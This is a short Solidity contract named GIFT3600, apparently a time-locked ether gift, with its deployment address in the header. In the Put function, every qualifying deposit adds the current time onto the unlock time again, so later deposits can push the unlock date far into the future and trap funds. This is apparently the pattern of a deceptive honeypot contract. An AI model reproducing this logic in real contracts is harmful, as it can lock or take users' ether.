/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT3600 at 0x7ffc2bd9431b059c509b45b33e77852d47de827d
*/
pragma solidity ^0.4.23;

contract GIFT3600
{
    bool closed = false;
    uint unlockTime = 3600;
    address sender;
    address receiver;
 
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }

    function() public payable { }
}